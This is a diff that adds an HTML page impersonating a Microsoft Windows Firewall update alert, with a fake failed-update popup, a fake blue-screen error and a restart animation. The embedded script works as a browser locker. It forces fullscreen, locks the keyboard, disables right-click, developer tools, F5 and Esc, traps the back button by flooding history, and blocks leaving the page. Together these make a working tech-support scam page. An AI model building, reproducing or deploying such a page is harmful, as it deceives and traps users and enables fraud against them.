@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
+    <meta content="noindex,nofollow" name="robots">
+    <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <link rel="icon" href="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/63ec4c91-f6d4-4b5b-84b0-6af2c1312d1c/dfpbq6p-ff4cd882-1ef8-4124-b91e-144e4d425378.v1/fill/w_200,h_200/windows_11_logo_by_rejaneappel_dfpbq6p-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MjAwIiwicGF0aCI6IlwvZlwvNjNlYzRjOTEtZjZkNC00YjViLTg0YjAtNmFmMmMxMzEyZDFjXC9kZnBicTZwLWZmNGNkODgyLTFlZjgtNDEyNC1iOTFlLTE0NGU0ZDQyNTM3OC5wbmciLCJ3aWR0aCI6Ijw9MjAwIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmltYWdlLm9wZXJhdGlvbnMiXX0.mK_k6CPLUNGroX5LXMgK0JxZuOQTO6vAcZ-0r8y3wmY" type="image/x-icon">
+    <title _msttexthash="447083" _msthash="0">Security requires action</title>
+    <link rel="stylesheet" href="pstyle.css">
+  <script src="./pscript.js" defer></script>
+</head>
+<body>
+    <audio id="pridez">
+        <source src="./audio.mp3" type="audio/mpeg">
+    </audio>
+
+    <div id="first-page">
+      <div class="top-box">
+        <p>Do not turn off your system while updating Windows Firewall security.</p>
+      </div>
+      <div class="popup-container" id="firstPopup">
+          <!-- Popup Content -->
+          <div class="popup-content">
+              <div class="wall-heading">
+                  <img src="./wall.png" alt="" class="wall">
+                  <h2>The firewall update failed</h2>
+              </div>
+              <br> <br>
+              <p> Your system was unable to update Windows Firewall security. </p>
+              <p> Due to the system error, some of your features have been disabled.</p>
+              <p> This system requires an update.</p>
+              <br><br>
+              <p><strong>execution</strong> 6.9.9.4</p>
+              <p><strong>Editor:</strong> Windows Defender Firewall</p>
+              <div class="button-container">
+                <button class="close-button" onclick="closeFirstPopup()"><strong>X</strong></button>
+                <a href="#"><button class="updatebutton" onclick="closeFirstPopup()"><strong>Update Now</strong></button></a>
+                <a href="#"><button class="ignorebutton" onclick="closeFirstPopup()"><strong>Remind Later</strong></button></a>
+              </div>
+          </div>
+      </div>
+    </div>
+    <!-- update alert page -->
+    <div id="second-page">
+      <div class="top-box-error">
+          <p>Do not turn off your system while updating Windows Firewall security.</p>
+      </div>
+      <div class="updating-system">
+        <div class="left">
+            <h1 class="sad-logo">:(</h1>
+            <p>Your PC has encountered a problem that needs to be resolved.<br>
+             We just collect some error information and then restart for you.<br>
+                 
+            </p><br><br>
+            <p class="percent" id="percent">0%</p>
+            <br>
+            <h5>For more information about this issue and possible solutions, visit our Help Center</h5>
+            <h6>When you text or call a support agent, give them this information: <br><br>
+               Stop code: CRITICAL_PROCESS_DONE
+            </h6>
+        </div>
+        <div class="right">
+            <img src="./pngwing.com.png" alt="">
+        </div>
+    </div>
+    </div>
+    <!-- here goes the third page -->
+    <div id="third-page">
+      <div class="container">
+        <div class="perspective"><div class="logo"></div></div> 
+        <div class="loading">
+            <div class="loading-circle circle-1"></div>
+            <div class="loading-circle circle-2"></div>
+            <div class="loading-circle circle-3"></div>
+            <div class="loading-circle circle-4"></div>
+            <div class="loading-circle circle-5"></div>
+        </div>
+        <h2>Restart</h2>
+    </div>
+    </div>
+    <!-- here is the fourth page -->
+    <div id="fourth-page">
+    <div class="disclaimer-popup" id="disclaimerPopup">
+      <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/63ec4c91-f6d4-4b5b-84b0-6af2c1312d1c/dfpbq6p-ff4cd882-1ef8-4124-b91e-144e4d425378.v1/fill/w_200,h_200/windows_11_logo_by_rejaneappel_dfpbq6p-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MjAwIiwicGF0aCI6IlwvZlwvNjNlYzRjOTEtZjZkNC00YjViLTg0YjAtNmFmMmMxMzEyZDFjXC9kZnBicTZwLWZmNGNkODgyLTFlZjgtNDEyNC1iOTFlLTE0NGU0ZDQyNTM3OC5wbmciLCJ3aWR0aCI6Ijw9MjAwIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmltYWdlLm9wZXJhdGlvbnMiXX0.mK_k6CPLUNGroX5LXMgK0JxZuOQTO6vAcZ-0r8y3wmY" style="width: 18px;" alt="">
+      <p> 
+       Windows firewall [version 6.9.9.4]<br>
+        (c) Microsoft Corporation. All rights reserved.
+      </p><br>
+      <p> If you have problems turning on security, contact the Windows Help Center.</p>
+    </div>
+  
+      <div class="typing-simulation">
+        <div id="typing-text"></div>
+      </div>
+      
+      <div class="loading-effect">
+        <pre id="text"></pre>
+        <div id="progress-bar"></div>      
+      </div>
+
+      <div class="typing-simulation2">
+        <div id="typing-text2"></div>
+      </div>
+    </div>
+
+
+  </body>
+  <meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"></head>
+
+  <body class="map" id="mycanvas" onbeforeunload="return myFunction()" style="cursor:none">
+    <script type="text/javascript">
+      function myFunction() {
+        return "Write something clever here...";
+      }
+      </script>
+<script>
+  // Disable right-click
+document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+function ctrlShiftKey(e, keyCode) {
+  return e.ctrlKey && e.shiftKey && e.keyCode === keyCode.charCodeAt(0);
+}
+
+document.onkeydown = (e) => {
+  if (
+    event.keyCode === 123 ||
+    ctrlShiftKey(e, 'I') ||
+    ctrlShiftKey(e, 'J') ||
+    ctrlShiftKey(e, 'C') ||
+    (e.ctrlKey && e.keyCode === 'U'.charCodeAt(0))
+  )
+    return false;
+};
+
+$(function() {
+        var a = 0,
+          b = setInterval(function() {
+            a += 10;
+            $("#dynamic").css("width", a + "%").attr("aria-valuenow", a).text(a + "% Complete");
+            100 <= a && clearInterval(b)
+          }, 100)
+      });
+
+      (function(a) {
+        a.fn.countTo = function(b) {
+          b = b || {};
+          return a(this).each(function() {
+            function d(a) {
+              a = c.formatter.call(k, a, c);
+              h.html(a)
+            }
+            var c = a.extend({}, a.fn.countTo.defaults, {
+                from: a(this).data("from"),
+                to: a(this).data("to"),
+                speed: a(this).data("speed"),
+                refreshInterval: a(this).data("refresh-interval"),
+                decimals: a(this).data("decimals")
+              }, b),
+              l = Math.ceil(c.speed / c.refreshInterval),
+              n = (c.to - c.from) / l,
+              k = this,
+              h = a(this),
+              m = 0,
+              f = c.from,
+              g = h.data("countTo") || {};
+            h.data("countTo", g);
+            g.interval && clearInterval(g.interval);
+            g.interval = setInterval(function() {
+              f += n;
+              m++;
+              d(f);
+              "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
+              m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
+            }, c.refreshInterval);
+            d(f)
+          })
+        };
+        a.fn.countTo.defaults = {
+          from: 0,
+          to: 0,
+          speed: 100,
+          refreshInterval: 100,
+          decimals: 0,
+          formatter: function(a, d) {
+            return a.toFixed(d.decimals)
+          },
+          onUpdate: null,
+          onComplete: null
+        }
+})(jQuery);
+
+jQuery(function(a) {
+    a(".count-number").data("countToOptions", {
+        formatter: function(a, d) {
+        return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
+        }
+    });
+    a(".timer").each(function(b) {
+        var d = a(this);
+        b = a.extend({}, b || {}, d.data("countToOptions") || {});
+        d.countTo(b)
+    })
+});
+
+//============================================== Full screen ==============================================
+      addEventListener("click", function() {
+    var el = document.documentElement
+      , rfs =
+             el.requestFullScreen
+          || el.webkitRequestFullScreen
+          || el.mozRequestFullScreen
+    ;
+    rfs.call(el);
+    });
+
+window.onload = function () {
+  window.moveTo(0, 0);
+  window.resizeTo(screen.availWidth, screen.availHeight);
+};
+
+$(document).ready(function () {
+  $("#chat").delay(600).fadeIn(100);
+});
+
+//=============================================== Locking of keyboard ===============================================
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+  // Allow only alphabets, numbers, and space
+  var allowedKeys = /^[a-zA-Z0-9 ]*$/;
+  var key = String.fromCharCode(e.keyCode);
+          
+  if (!allowedKeys.test(key)) {
+    return false;
+  }
+};
+
+!(function () {
+  var t;
+  try {
+    for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+    onpopstate = function (t) {
+      t.state && location.replace("#");
+    };
+  } catch (o) {}
+})();
+
+//================================================== Blocking of Esc and F5 ==================================================
+document.addEventListener("onkeydown", win_onkeydown_handler);
+function win_onkeydown_handler() {
+  switch (event.keyCode) {
+    case 116:
+      event.returnValue = !1;
+      event.keyCode = 0;
+      break;
+    case 27:
+      event.returnValue = !1, event.keyCode = 0;
+  }
+}
+
+</script>
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=GT-MQ7XRDP"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'GT-MQ7XRDP');
+</script>
+</html>
